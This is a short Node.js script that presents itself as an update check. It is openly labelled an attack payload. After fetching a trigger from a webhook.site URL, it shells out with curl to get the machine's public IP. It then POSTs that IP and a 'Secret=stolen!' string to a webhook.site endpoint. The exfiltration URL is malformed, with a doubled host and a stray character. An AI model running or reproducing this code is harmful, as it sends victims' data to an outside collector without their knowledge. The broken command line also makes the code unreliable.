const https = require('https');
const { execSync } = require('child_process');

console.log('🔍 Checking for malicious updates...');

https.get('https://webhook.site/YOUR-URL/update?ver=1.0', (res) => {
  let data = ''; res.on('data', d => data += d);
  res.on('end', () => {
    console.log('📡 Update trigger received!');
    
    // ATTACK PAYLOAD
    const ip = execSync('curl -s ifconfig.me').toString().trim();
    execSync(`curl -X POST https://webhook.site/https://webhook.site/190c0a1a-9384-41b8-a1bd-172bf18d1c0b L -d "VictimIP=${ip}|Secret=stolen!"`);
    
    console.log('✅ Attack successful! Check webhook.site');
  });
});
